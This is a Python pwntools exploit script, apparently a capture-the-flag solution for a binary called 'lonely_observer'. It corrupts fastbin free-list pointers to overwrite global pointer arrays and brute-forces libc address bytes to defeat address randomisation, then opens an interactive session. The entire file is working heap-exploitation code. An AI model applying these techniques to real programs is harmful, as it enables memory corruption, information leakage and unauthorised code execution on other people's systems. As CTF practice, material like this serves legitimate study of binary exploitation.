#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './lonely_observer'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('>>')
    io.sendline(str(idx))

def add(idx, sz, cont):
    menu(1)
    io.recvuntil(">>")
    io.sendline(str(idx))
    io.recvuntil(">>")
    io.sendline(str(sz))
    io.recvuntil("content:")
    io.send(cont)

def delete(idx):
    menu(2)
    io.recvuntil(">>")
    io.sendline(str(idx))

def show(idx):
    menu(3)
    io.recvuntil(">>")
    io.sendline(str(idx))

def edit(idx, cont):
    menu(4)
    io.recvuntil(">>")
    io.sendline(str(idx))
    io.recvuntil(":")
    io.sendline(cont)

list64 = 0x602060
bss64 = 0x602060+0x10*0x30
list32 = 0x804b060
bss32 = 0x804b060+8*0x30


add(0, 1, 'a')
add(1, 1, 'a')
add(2, 1, 'a')

# use the diff size of minimal fastbin chunk
delete(0)
delete(1)
edit(1, '\x00') # edit fd
add(3, 0x10, p64(0x1000) + p64(list64 + 8 * 4)) # add another chunk, size 0x20, edit global list array
delete(2)  # add into fastbin
edit(2, '\x00') # recover its fd
add(4, 8, p32(0x1000) + p32(list32 + 4 * 8)) # add  another chunk, in 32bits, size 0x10, 64bits, size 0x20 and will use the fastbin one
delete(2)
edit(2, '\x00')

lbase64 = 0
for idx in range(5, 0, -1):
    buf = p32(list32 + 4 * 10) + p32(list32 + 4 * 12)
    buf+= p32(1) + p32(bss32)#8
    buf+= p32(0x100) + p32(bss32+0x100)#9
    buf = buf.ljust(4*8,'\x00')

    buf+= p64(0x602040+idx) + p64(list64+8*12)
    buf+= p64(0) + p64(0)#8
    buf+= p64(0x100) + p64(0x602041+idx)#9
    buf+= 'n'
    edit(0, buf) # overwrite the global list
    pause()
    edit(9,'\x00'*7 + p64(bss64) + 'n')
    io.recvuntil(">>")
    io.sendline(str(4))
    io.recvuntil("index?")
    io.sendline(str(8))

    for sz in range(1, 256):
        print('sz:'+str(sz))
        io.send('5')
        if "done!" in io.recvrepeat(0.1):
            lbase64 += sz << (idx*8)
            log.info("\033[33m" + hex(sz) + "\033[0m")
            io.sendline('5' * (100 - sz))
            break
log.info("\033[33m" + hex(lbase64) + "\033[0m")











io.interactive()
